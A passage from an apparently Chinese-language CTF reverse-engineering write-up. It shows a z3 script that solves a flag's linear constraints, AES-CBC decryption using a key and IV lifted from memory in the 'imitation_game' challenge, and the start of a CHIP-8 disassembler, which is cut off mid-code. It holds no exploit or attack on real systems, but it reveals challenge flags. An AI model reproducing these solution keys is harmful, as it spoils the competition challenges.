class="hljs-number">0xFFFD6E33</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0xFFFF0427</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFD0153</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xFFFF66A5</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xFBC7B90A</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x1DAAC</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xFFFE92AC</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0xFFFF9AD4</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x2C78D</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFC69EE</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFC1736</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x47762</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0x28557</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0x27B6D</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xFFFF7F4E</span> + f[<span class="hljs-number">10</span>] * <span class="hljs-number">0x2F9DF</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0x1AF43AB</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0xFFFDFD46</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xFFFBD6F6</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x13A87</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x42997</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0x244E9</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0x20A60</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x0C3F6</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0xFFFC0F74</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFE4DC8</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xFFFE94DC</span> + f[<span class="hljs-number">10</span>] * <span class="hljs-number">0xFFFFECB4</span> + f[<span class="hljs-number">11</span>] * <span class="hljs-number">0xFFFD79C6</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xFEAFEC1F</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0xFFFE7848</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0x23EE3</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0xFFFCBAB4</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x27C92</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFBFD5C</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFD30C3</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x5009</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0xFFFE93F1</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFDE3F3</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0x228DC</span> + f[<span class="hljs-number">10</span>] * <span class="hljs-number">0x25EE</span> + f[<span class="hljs-number">11</span>] * <span class="hljs-number">0xF242</span> + f[<span class="hljs-number">12</span>] * <span class="hljs-number">0x1160E</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xFE20EC14</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x648B</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xFFFCF002</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0xFFFE2E15</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x1E041</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0x594B</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFF3713</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0xFFFED96C</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0x1C620</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFF282A</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xFFFF0E48</span> + f[<span class="hljs-number">10</span>] * <span class="hljs-number">0xFFFEAC54</span> + f[<span class="hljs-number">11</span>] * <span class="hljs-number">0xEA5F</span> + f[<span class="hljs-number">12</span>] * <span class="hljs-number">0x35CF4</span> + f[<span class="hljs-number">13</span>] * <span class="hljs-number">0xFFFC920E</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xFDCA76A0</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x107E1</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0x440D9</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0xFFFFF5C3</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x30766</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0x21281</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0x235C2</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x1B2CE</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0x16687</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0x493EC</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0x26716</span> + f[<span class="hljs-number">0xA</span>] * <span class="hljs-number">0xFFFC84CB</span> + f[<span class="hljs-number">0xB</span>] * <span class="hljs-number">0xFFFEA6FA</span> + f[<span class="hljs-number">0xC</span>] * <span class="hljs-number">0xFFFC2F98</span> + f[<span class="hljs-number">0xD</span>] * <span class="hljs-number">0xFFFD1A3E</span> + f[<span class="hljs-number">0xE</span>] * <span class="hljs-number">0x390BF</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0x5920B01</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x24225</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xFFFD39FC</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x1EAE2</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x2F613</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFC66F9</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFE0433</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x3E19</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0x1BDFF</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFC6EAB</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xFFFD810C</span> + f[<span class="hljs-number">0xA</span>] * <span class="hljs-number">0x0D519</span> + f[<span class="hljs-number">0xB</span>] * <span class="hljs-number">0x384EC</span> + f[<span class="hljs-number">0xC</span>] * <span class="hljs-number">0x197E5</span> + f[<span class="hljs-number">0xD</span>] * <span class="hljs-number">0xFFFFD159</span> + f[<span class="hljs-number">0xE</span>] * <span class="hljs-number">0xFFFF43D9</span> + f[<span class="hljs-number">0xF</span>] * <span class="hljs-number">0xFFFC28DF</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xFDD0E812</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x111A3</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xFFFF32EB</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x3E3F9</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0xFFFE9E4B</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFFFB1A</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFF65B9</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0xFFFDF970</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0xFFFB936C</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFEF482</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0x57B6</span> + f[<span class="hljs-number">0xA</span>] * <span class="hljs-number">0x8813</span> + f[<span class="hljs-number">0xB</span>] * <span class="hljs-number">0x25CDC</span> + f[<span class="hljs-number">0xC</span>] * <span class="hljs-number">0x12190</span> + f[<span class="hljs-number">0xD</span>] * <span class="hljs-number">0x427BE</span> + f[<span class="hljs-number">0xE</span>] * <span class="hljs-number">0xFFFC8358</span> + f[<span class="hljs-number">0xF</span>] * <span class="hljs-number">0xFFFCE4EE</span> + f[<span class="hljs-number">0x10</span>] * <span class="hljs-number">0x43BB5</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xFF9ADC73</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0xFFFC313D</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0x1023B</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x2E27A</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0xFFFDCCD4</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFE498F</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFFEC0D</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x3A1A3</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0xFFFCC8E2</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFC37B6</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xFFFF2FE9</span> + f[<span class="hljs-number">0xA</span>] * <span class="hljs-number">0xFFFE8E68</span> + f[<span class="hljs-number">0xB</span>] * <span class="hljs-number">0x1F45C</span> + f[<span class="hljs-number">0xC</span>] * <span class="hljs-number">0xFFFEAC48</span> + f[<span class="hljs-number">0xD</span>] * <span class="hljs-number">0xFFFDBD08</span> + f[<span class="hljs-number">0xE</span>] * <span class="hljs-number">0x2A28</span> + f[<span class="hljs-number">0xF</span>] * <span class="hljs-number">0xD72D</span> + f[<span class="hljs-number">0x10</span>] * <span class="hljs-number">0xFFFF70B8</span> + f[<span class="hljs-number">0x11</span>] * <span class="hljs-number">0xFFFFE90F</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0xFCD6008F</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0xFFFBB7A0</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xFFFF0015</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0xFFFD2918</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x1882D</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFEDE1F</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0x2FB77</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x20D94</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0x14A94</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFDA0CD</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xDE69</span> + f[<span class="hljs-number">0xA</span>] * <span class="hljs-number">0x2FE8</span> + f[<span class="hljs-number">0xB</span>] * <span class="hljs-number">0x2ABE5</span> + f[<span class="hljs-number">0xC</span>] * <span class="hljs-number">0x26530</span> + f[<span class="hljs-number">0xD</span>] * <span class="hljs-number">0x4C3D</span> + f[<span class="hljs-number">0xE</span>] * <span class="hljs-number">0x2383E</span> + f[<span class="hljs-number">0xF</span>] * <span class="hljs-number">0x42763</span> + f[<span class="hljs-number">0x10</span>] * <span class="hljs-number">0xE5C9</span> + f[<span class="hljs-number">0x11</span>] * <span class="hljs-number">0x539</span> + f[<span class="hljs-number">0x12</span>] * <span class="hljs-number">0xFFFC5AF3</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0x39F3331</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0xFFFD67BD</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0xFFFCFC61</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x21FB1</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x2AFE7</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFE2316</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFDE3DE</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0xFFFCF431</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0xFFFF1A07</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFD1877</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xFFFBAB46</span> + f[<span class="hljs-number">0xA</span>] * <span class="hljs-number">0xFFFFB7A8</span> + f[<span class="hljs-number">0xB</span>] * <span class="hljs-number">0x44C76</span> + f[<span class="hljs-number">0xC</span>] * <span class="hljs-number">0x3C062</span> + f[<span class="hljs-number">0xD</span>] * <span class="hljs-number">0x26DA8</span> + f[<span class="hljs-number">0xE</span>] * <span class="hljs-number">0x217FE</span> + f[<span class="hljs-number">0xF</span>] * <span class="hljs-number">0x27911</span> + f[<span class="hljs-number">0x10</span>] * <span class="hljs-number">0xD484</span> + f[<span class="hljs-number">0x11</span>] * <span class="hljs-number">0x217F6</span> + f[<span class="hljs-number">0x12</span>] * <span class="hljs-number">0xFFFF711C</span> + f[<span class="hljs-number">0x13</span>] * <span class="hljs-number">0xFFFE6835</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0x4AF658</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x6C67</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0x4210C</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x24372</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0xFFFF64A1</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0xFFFE83FC</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0xFFFC59E3</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0x1A675</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0x29403</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0x122E6</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0x479E1</span> + f[<span class="hljs-number">0xA</span>] * <span class="hljs-number">0xFFFE556B</span> + f[<span class="hljs-number">0xB</span>] * <span class="hljs-number">0xFFFEE2E8</span> + f[<span class="hljs-number">0xC</span>] * <span class="hljs-number">0xFFFD0C98</span> + f[<span class="hljs-number">0xD</span>] * <span class="hljs-number">0xF761</span> + f[<span class="hljs-number">0xE</span>] * <span class="hljs-number">0xFFFCF4FD</span> + f[<span class="hljs-number">0xF</span>] * <span class="hljs-number">0x24A14</span> + f[<span class="hljs-number">0x10</span>] * <span class="hljs-number">0x2C39B</span> + f[<span class="hljs-number">0x11</span>] * <span class="hljs-number">0xFFFF914F</span> + f[<span class="hljs-number">0x12</span>] * <span class="hljs-number">0x94F9</span> + f[<span class="hljs-number">0x13</span>] * <span class="hljs-number">0x1F3A9</span> + f[<span class="hljs-number">0x14</span>] * <span class="hljs-number">0xFFFD85A7</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0x2B77651</span>)</span><br><span class="line">solver.add((f[<span class="hljs-number">6</span>] * <span class="hljs-number">0x0B245</span> + f[<span class="hljs-number">5</span>] * <span class="hljs-number">0x47951</span> + f[<span class="hljs-number">2</span>] * <span class="hljs-number">0x3C177</span> + f[<span class="hljs-number">3</span>] * <span class="hljs-number">0x2026C</span> + f[<span class="hljs-number">4</span>] * <span class="hljs-number">0x2BD3A</span> + f[<span class="hljs-number">1</span>] * <span class="hljs-number">0x0AE83</span> + f[<span class="hljs-number">0</span>] * <span class="hljs-number">0xFFFF67E2</span> + f[<span class="hljs-number">7</span>] * <span class="hljs-number">0x0FC81</span> + f[<span class="hljs-number">8</span>] * <span class="hljs-number">0xFFFD1DCD</span> + f[<span class="hljs-number">9</span>] * <span class="hljs-number">0xFFFE7D87</span> + f[<span class="hljs-number">0xA</span>] * <span class="hljs-number">0x40428</span> + f[<span class="hljs-number">0xB</span>] * <span class="hljs-number">0x1AC25</span> + f[<span class="hljs-number">0xC</span>] * <span class="hljs-number">0x47B95</span> + f[<span class="hljs-number">0xD</span>] * <span class="hljs-number">0xFFFBD35D</span> + f[<span class="hljs-number">0xE</span>] * <span class="hljs-number">0xFFFD55C5</span> + f[<span class="hljs-number">0xF</span>] * <span class="hljs-number">0x255EF</span> + f[<span class="hljs-number">0x10</span>] * <span class="hljs-number">0xFFFCA285</span> + f[<span class="hljs-number">0x11</span>] * <span class="hljs-number">0x1B4F2</span> + f[<span class="hljs-number">0x12</span>] * <span class="hljs-number">0xFFFBA306</span> + f[<span class="hljs-number">0x13</span>] * <span class="hljs-number">0x3B929</span> + f[<span class="hljs-number">0x14</span>] * <span class="hljs-number">0xEC4C</span>+f[<span class="hljs-number">0x15</span>]*<span class="hljs-number">0xFFFCD49C</span>) &amp; <span class="hljs-number">0xffffffff</span> == <span class="hljs-number">0x49F26C9</span>)</span><br><span class="line"><span class="hljs-keyword">while</span> solver.check() == sat:</span><br><span class="line">   flag = <span class="hljs-string">""</span></span><br><span class="line">   model = solver.model()</span><br><span class="line">   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(f)):</span><br><span class="line">       flag += <span class="hljs-built_in">chr</span>(model[f[i]].as_long())</span><br><span class="line">       <span class="hljs-built_in">print</span>(flag)</span><br><span class="line">       solver.add(RecurOr(f, model))</span><br><span class="line"><span class="hljs-comment"># flag{g0_Fuck_xx_5egm3n</span></span><br></pre></td></tr></tbody></table></figure><p>根据题目描述，<code>先做这个热热身，做完这个再去做xx_segment_obf也不迟</code>，猜测flag为</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{g<span class="hljs-number">0</span>_Fuck_xx_<span class="hljs-number">5</span>egm<span class="hljs-number">3</span>nt_<span class="hljs-number">0</span>bf}</span><br></pre></td></tr></tbody></table></figure><p>提交成功</p><h2 id="imitation-game"><a href="#imitation-game" class="headerlink" title="imitation_game"></a>imitation_game</h2><p>运行程序，首先输出flag提示，flag有两部分，先过第一部分才会运行第二部分的程序</p><p>调试程序，调试过程中发现AES的s-box，发现输入了明文之后在后面pad了32位\x1a，然后进行AES-CBC加密，密钥和iv还有最终运行的结果可以在内存里找到，直接解密</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_to_16</span>(<span class="hljs-params">text</span>):</span></span><br><span class="line">   <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text.encode(<span class="hljs-string">'utf-8'</span>)) % <span class="hljs-number">16</span>:</span><br><span class="line">       add = <span class="hljs-number">16</span> - (<span class="hljs-built_in">len</span>(text.encode(<span class="hljs-string">'utf-8'</span>)) % <span class="hljs-number">16</span>)</span><br><span class="line">   <span class="hljs-keyword">else</span>:</span><br><span class="line">       add = <span class="hljs-number">0</span></span><br><span class="line">   text = text + (<span class="hljs-string">'\0'</span> * add)</span><br><span class="line">   <span class="hljs-keyword">return</span> text.encode(<span class="hljs-string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">text</span>):</span></span><br><span class="line">   key = <span class="hljs-string">b"\x3E\x2C\x25\x13\x18\xBE\xC3\x6B\xA1\x37\x24\x53\x03\x1E\x51\xEC"</span></span><br><span class="line">   iv = <span class="hljs-string">b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F"</span></span><br><span class="line">   mode = AES.MODE_CBC</span><br><span class="line">   text = add_to_16(text)</span><br><span class="line">   cryptos = AES.new(key, mode, iv)</span><br><span class="line">   cipher_text = cryptos.encrypt(text)</span><br><span class="line">   <span class="hljs-keyword">return</span> b2a_hex(cipher_text)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">text</span>):</span></span><br><span class="line">   key = <span class="hljs-string">b"\x3E\x2C\x25\x13\x18\xBE\xC3\x6B\xA1\x37\x24\x53\x03\x1E\x51\xEC"</span></span><br><span class="line">   iv = <span class="hljs-string">b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F"</span></span><br><span class="line">   mode = AES.MODE_CBC</span><br><span class="line">   cryptos = AES.new(key, mode, iv)</span><br><span class="line">   plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">   <span class="hljs-keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">   e = encrypt(<span class="hljs-string">"6c8f1d78770fe672122478c6f9a150e8\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a"</span>)</span><br><span class="line">   d = decrypt(<span class="hljs-string">b"9D7BA23CB1099A4841D16663D6AE3CAB87ED59C2D3DA2A05BA5129C15D426A9A0514DBBEAE838B6FD3594152344E39C566E1E3EC0618149F4EB770009077D8AE"</span>)</span><br><span class="line">   <span class="hljs-built_in">print</span>(<span class="hljs-string">"加密:"</span>, e)</span><br><span class="line">   <span class="hljs-built_in">print</span>(<span class="hljs-string">"解密:"</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 6c8f1d78770fe672122478c6f9a150e8</span></span><br></pre></td></tr></tbody></table></figure><p>得到第一部分flag，进入第二部分，调用了game.bin文件，根据提示是一个chip8的模拟器，一共输入10位数，错误则提示dead</p><p>有了提示之后好做了很多，根据chip8的指令集解析一下game.bin文件</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'game.txt'</span>, <span class="hljs-string">'r+'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">   s = f.read()</span><br><span class="line">   <span class="hljs-comment"># print(s)</span></span><br><span class="line">j = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s), <span class="hljs-number">5</span>):</span><br><span class="line">   t = s[i:i + <span class="hljs-number">4</span>]</span><br><span class="line">   <span class="hljs-comment"># print(t)</span></span><br><span class="line">   <span class="hljs-built_in">print</span>(<span class="hljs-string">"addr:"</span> + <span class="hljs-built_in">hex</span>(j + <span class="hljs-number">0x200</span>), end=<span class="hljs-string">"   "</span>)</span><br><span class="line">   j += <span class="hljs-number">2</span></span><br><span class="line">   <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'0'</span>:</span><br><span class="line">       <span class="hljs-keyword">if</span> t[<span class="hljs-number">1</span>] == <span class="hljs-string">'0'</span> <span class="hljs-keyword">and</span> t[<span class="hljs-number">2</span>] == <span class="hljs-string">'e'</span>:</span><br><span class="line">          <span class="hljs-keyword">if</span> t[<span class="hljs-number">3</span>] == <span class="hljs-string">'1'</span>:</span><br><span class="line">              <span class="hljs-built_in">print</span>(<span class="hljs-string">"clear screen"</span>)</span><br><span class="line">          <span class="hljs-keyword">elif</span> t[<span class="hljs-number">3</span>] == <span class="hljs-string">'f'</span>:</span><br><span class="line">              <span class="hljs-built_in">print</span>(<span class="hljs-string">"Returns from a subroutine"</span>)</span><br><span class="line">          <span class="hljs-keyword">else</span>:</span><br><span class="line">              <span class="hljs-built_in">print</span>(<span class="hljs-string">"call program at addr: "</span> + t[<span class="hljs-number">1</span>:])</span><br><span class="line">       <span class="hljs-keyword">else</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(<span class="hljs-string">"call program at addr: "</span> + t[<span class="hljs-number">1</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'1'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"jmp "</span> + t[<span class="hljs-number">1</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'2'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"call "</span> + t[<span class="hljs-number">1</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'3'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"Skips the next instruction if V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">" equals "</span> + t[<span class="hljs-number">2</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'4'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"Skips the next instruction if V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">" not equals "</span> + t[<span class="hljs-number">2</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'5'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"Skips the next instruction if V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">" equals V"</span> + t[<span class="hljs-number">2</span>])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'6'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">" = "</span> + t[<span class="hljs-number">2</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'7'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">" += "</span> + t[<span class="hljs-number">2</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span 